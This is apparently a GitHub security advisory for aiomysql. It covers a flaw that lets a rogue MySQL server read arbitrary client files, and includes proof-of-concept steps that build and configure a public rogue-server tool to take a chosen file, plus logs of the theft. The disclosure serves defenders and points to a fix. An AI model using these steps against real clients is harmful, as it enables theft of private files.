# [H] aiomysql allows arbitrary access to client files through vulnerability of a malicious MySQL server

## Summary
Severity: High
Advisory: GHSA-r397-ff8c-wv2g
CVE: CVE-2025-62611
CWE: CWE-73
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-10-22
Source: https://github.com/advisories/GHSA-r397-ff8c-wv2g
Type: github-advisory

## Affected
- PyPI: `aiomysql` — affected >=0 <0.3.0

## Details
### Summary
The client-side settings are not checked before sending local files to MySQL server, which allows obtaining arbitrary files from the client using a rogue server.

### Details
It is possible to create a rogue MySQL server that emulates authorization, ignores client flags and requests arbitrary files from the client by sending a LOAD_LOCAL instruction packet. Related to CVE-2019-2503.

### PoC
First, start up a rogue MySQL server that ignores client-side flags and sends LOAD_LOCAL packet to the client – tested with https://github.com/rmb122/rogue_mysql_server

1. Create a file to be stolen by the rogue server: `echo "gotcha" > /tmp/my_secret_file.txt`
2. Clone the repo: `git clone git@github.com:rmb122/rogue_mysql_server.git && cd rogue_mysql_server`
3. Build the server: `make rogue_mysql_server`
4. Generate a sample config: `rogue_mysql_server -generate`
5. In `config.yaml` change `file_list` to `["/tmp/my_secret_file.txt"]`
6. Run the server: `./rogue_mysql_server -config config.yaml`

Next, the vulnerability can be seen in action with the following script, which can be run in a second terminal:
```python3
import asyncio

import aiomysql


loop = asyncio.get_event_loop()


async def test_example():
    conn = await aiomysql.connect(
        host="127.0.0.1",
        port=3306,
        user="root",
        password="",
        db="mysql",
        loop=loop,
        local_infile=0, # note that we explicitly forbid local_infile
    )

    cursor = await conn.cursor()
    await cursor.execute("SELECT 1")
    print(cursor.description)
    r = await cursor.fetchall()
    print(r)
    await cursor.close()
    conn.close()


loop.run_until_complete(test_example())
```

The rogue server will output log messages indicating successful file read and save the contents in the `loot/` directory
```
level=info msg="Client from addr [xxx], ID [1] try to query [select 1]"
level=info msg="Now try to read file [/tmp/my_secret_file.txt] from addr [xxx], ID [1]"
level=info msg="Read success, stored at [./loot/xxx/1757403852610__tmp_top_secret_file.txt]"
level=info msg="Client leaved, Addr [xxx], ID [1]"
```

### Impact
This vulnerability impacts products and environments that require connection to untrusted MySQL servers or allow the possibility for them to be compromised.

### Fix suggestion
Can be fixed by porting relevant changes from PyMySQL – https://github.com/PyMySQL/PyMySQL/commit/b5e17cee46e0706dbfd707cdd2024452f0fb3267
